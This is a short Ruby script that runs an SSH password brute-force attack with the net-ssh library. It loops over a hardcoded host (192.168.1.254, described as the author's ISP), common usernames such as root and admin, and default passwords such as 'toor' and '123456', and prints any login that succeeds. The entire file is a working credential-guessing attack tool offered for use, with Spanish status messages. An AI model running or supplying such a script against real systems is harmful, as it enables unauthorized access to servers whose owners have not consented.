#!/usr/bin/env ruby
# author: eleAche
require 'net/ssh' # gem install net-ssh
# 192.168.1.254 is my Internet Service Provider (ISP)

def attack_ssh(host, user, password, port=22, timeout=2)
    begin
        Net::SSH.start(host,user, :password => password,
        :auth_methods => ["password"], :port => port,
        :non_interactive => true, :timeout => timeout) do |session|
        puts "Password found: #{host} | #{user}:#{password}"
        end
    rescue Net::SSH::ConnectionTimeout
        puts "[!] El host #{host} no esta vivo"
    rescue Net::SSH::Timeout
        puts "[!] El host #{host} se encuentra desconectado"
    rescue Errno::ECONNREFUSED
        puts "[!] El puerto #{port} incorrecto para el host #{host}"
    rescue Net::SSH::AuthenticationFailed
        puts "password incorrecta"
    rescue Net::SSH::Authentication::DisallowedMethod
        puts "[!] El host no acepta password"
    end
end

# hosts is the bruteforceAttack target
hosts = ['192.168.1.254']
users = ['admin','administrator','user', 'root']
pass = ['toor', '123456', 'admin']

puts "Atacando: #{hosts}"
# Bruteforce: the number of intents is defined for: (users x passs) = number_of_tries
hosts.each do |host|
    users.each do |user|
        pass.each do |pass|
            attack_ssh host, user, pass
        end
    end
end
